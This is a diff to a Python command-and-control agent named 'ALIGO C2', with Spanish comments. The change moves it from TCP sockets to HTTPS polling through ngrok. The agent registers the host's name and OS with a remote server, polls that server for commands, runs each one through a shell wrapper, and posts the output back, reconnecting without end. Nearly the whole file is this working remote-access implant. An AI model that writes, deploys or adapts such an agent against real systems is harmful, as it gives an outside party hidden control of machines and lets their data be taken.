@@ -1,13 +1,13 @@
 """
-Agente C2 - Versión para ngrok/Internet
-CONFIGURADO PARA: Conectarse a servidor via ngrok o IP pública
+Agente C2 - Versión HTTPS para ngrok/Internet
+CONFIGURADO PARA: Conectarse a servidor via HTTP/HTTPS (ngrok)
 
 USO:
-    python3 agent_ngrok.py 4.tcp.ngrok.io 15432
-    python3 agent_ngrok.py servidor.ejemplo.com 4444
+    python3 agent_ngrok.py https://abc123.ngrok.io
+    python3 agent_ngrok.py http://servidor.ejemplo.com:5000
+    python3 agent_ngrok.py https://abc123.ngrok-free.app
 """
 
-import socket
 import json
 import subprocess
 import platform
@@ -15,44 +15,29 @@ import uuid
 import time
 import sys
 
+try:
+    import requests
+except ImportError:
+    print("[!] ERROR: Se requiere el módulo 'requests'")
+    print("[*] Instálalo con: pip install requests")
+    sys.exit(1)
+
 # ============================================
 # CONFIGURACIÓN FLEXIBLE
 # ============================================
 
-# Valores por defecto (cambiar según tu servidor)
-DEFAULT_HOST = "4.tcp.ngrok.io"  # Cambia esto con tu URL de ngrok
-DEFAULT_PORT = 4444
+# Valores por defecto (cambiar según tu servidor ngrok)
+DEFAULT_URL = "https://your-ngrok-url.ngrok.io"
 
-# Si se pasan argumentos de línea de comandos, usarlos
-if len(sys.argv) >= 3:
-    SERVER_HOST = sys.argv[1]
-    SERVER_PORT = int(sys.argv[2])
-elif len(sys.argv) == 2:
-    SERVER_HOST = sys.argv[1]
-    SERVER_PORT = DEFAULT_PORT
+# Si se pasa argumento de línea de comandos, usarlo
+if len(sys.argv) >= 2:
+    SERVER_URL = sys.argv[1].rstrip('/')  # Quitar / final si existe
 else:
-    SERVER_HOST = DEFAULT_HOST
-    SERVER_PORT = DEFAULT_PORT
+    SERVER_URL = DEFAULT_URL
 
 AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
 RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión
-
-
-def send_json(sock, data: dict):
-    msg = json.dumps(data) + "\n"
-    sock.sendall(msg.encode())
-
-
-def recv_json(sock, buffer: str):
-    while "\n" not in buffer:
-        chunk = sock.recv(4096)
-        if not chunk:
-            return None, buffer
-        buffer += chunk.decode(errors="ignore")
-    line, buffer = buffer.split("\n", 1)
-    if not line.strip():
-        return {}, buffer
-    return json.loads(line), buffer
+POLL_INTERVAL = 2    # segundos entre cada poll al servidor
 
 
 def execute_command(command: str) -> str:
@@ -73,71 +58,129 @@ def execute_command(command: str) -> str:
         return f"(error) {e}"
 
 
-def run_agent():
-    print(f"[*] Agente ID: {AGENT_ID}")
-    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
-    print(f"[*] Presiona Ctrl+C para detener")
-    print()
-    
-    while True:  # loop de reconexión
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)  # timeout de 10 segundos para conectar
-            sock.connect((SERVER_HOST, SERVER_PORT))
-            sock.settimeout(None)  # quitar timeout después de conectar
-            
-            print(f"[+] ✅ Conectado al servidor como {AGENT_ID}")
-
-            # Registro inicial
-            send_json(sock, {
-                "type": "hello",
+def checkin():
+    """Registro inicial en el servidor."""
+    try:
+        response = requests.post(
+            f"{SERVER_URL}/checkin",
+            json={
                 "agent_id": AGENT_ID,
                 "hostname": platform.node(),
                 "os": platform.system(),
-            })
+            },
+            timeout=10
+        )
+        response.raise_for_status()
+        return True
+    except Exception as e:
+        print(f"[!] Error en checkin: {e}")
+        return False
 
-            buffer = ""
+
+def poll_command():
+    """Preguntar al servidor si hay comandos pendientes."""
+    try:
+        response = requests.post(
+            f"{SERVER_URL}/poll",
+            json={"agent_id": AGENT_ID},
+            timeout=10
+        )
+        response.raise_for_status()
+        data = response.json()
+        
+        if data.get("command") is not None:
+            return data
+        return None
+    except Exception as e:
+        print(f"[!] Error en poll: {e}")
+        return None
+
+
+def send_result(msg_id: str, output: str, status: str = "ok"):
+    """Enviar resultado de comando al servidor."""
+    try:
+        response = requests.post(
+            f"{SERVER_URL}/result",
+            json={
+                "agent_id": AGENT_ID,
+                "id": msg_id,
+                "output": output,
+                "status": status,
+            },
+            timeout=10
+        )
+        response.raise_for_status()
+        return True
+    except Exception as e:
+        print(f"[!] Error enviando resultado: {e}")
+        return False
+
+
+def run_agent():
+    print(f"[*] Agente ID: {AGENT_ID}")
+    print(f"[*] Servidor: {SERVER_URL}")
+    print(f"[*] Presiona Ctrl+C para detener")
+    print()
+    
+    # Loop principal
+    while True:
+        try:
+            # Paso 1: Checkin (registro inicial)
+            print(f"[*] Intentando checkin con el servidor...")
+            if not checkin():
+                print(f"[!] Checkin falló, reintentando en {RECONNECT_DELAY}s...")
+                time.sleep(RECONNECT_DELAY)
+                continue
+            
+            print(f"[+] ✅ Conectado al servidor como {AGENT_ID}")
+            
+            # Paso 2: Loop de polling
             while True:
-                msg, buffer = recv_json(sock, buffer)
-                if msg is None:
-                    print("[!] Servidor cerró la conexión")
-                    break
-                if msg.get("type") == "cmd":
-                    cmd = msg.get("command")
-                    msg_id = msg.get("id")
+                # Preguntar si hay comandos
+                cmd_data = poll_command()
+                
+                if cmd_data and cmd_data.get("type") == "cmd":
+                    cmd = cmd_data.get("command")
+                    msg_id = cmd_data.get("id")
+                    
                     print(f"[cmd recibido] id={msg_id}: {cmd}")
+                    
+                    # Ejecutar comando
                     output = execute_command(cmd)
-                    send_json(sock, {
-                        "type": "result",
-                        "id": msg_id,
-                        "agent_id": AGENT_ID,
-                        "output": output,
-                        "status": "ok",
-                    })
-                    print(f"[resultado enviado] id={msg_id}")
-
-        except socket.timeout:
-            print(f"[!] Timeout al conectar a {SERVER_HOST}:{SERVER_PORT}")
-            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la dirección?")
+                    
+                    # Enviar resultado
+                    if send_result(msg_id, output):
+                        print(f"[resultado enviado] id={msg_id}")
+                    else:
+                        print(f"[!] Fallo al enviar resultado id={msg_id}")
+                
+                # Esperar antes del siguiente poll
+                time.sleep(POLL_INTERVAL)
+        
+        except requests.exceptions.ConnectionError:
+            print(f"[!] No se pudo conectar al servidor: {SERVER_URL}")
+            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la URL?")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
-        except socket.gaierror:
-            print(f"[!] No se pudo resolver el hostname: {SERVER_HOST}")
-            print(f"[*] Verifica que la URL sea correcta")
+        
+        except requests.exceptions.Timeout:
+            print(f"[!] Timeout al conectar a {SERVER_URL}")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
-        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
-            print(f"[!] Error de conexión: {e}")
-            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
-            time.sleep(RECONNECT_DELAY)
+        
         except KeyboardInterrupt:
             print("\n[*] Agente detenido por el usuario")
             sys.exit(0)
+        
+        except Exception as e:
+            print(f"[!] Error inesperado: {e}")
+            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
+            time.sleep(RECONNECT_DELAY)
 
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("  ALIGO C2 - Agente")
+    print("  ALIGO C2 - Agente HTTPS")
     print("=" * 50)
     print()
     
@@ -145,7 +188,8 @@ if __name__ == "__main__":
         print("[i] Usando configuración de línea de comandos")
     else:
         print("[i] Usando configuración por defecto")
-        print(f"[i] Puedes especificar: python3 {sys.argv[0]} <host> <puerto>")
+        print(f"[i] Puedes especificar: python3 {sys.argv[0]} <url>")
+        print(f"[i] Ejemplo: python3 {sys.argv[0]} https://abc123.ngrok.io")
     
     print()
     run_agent()
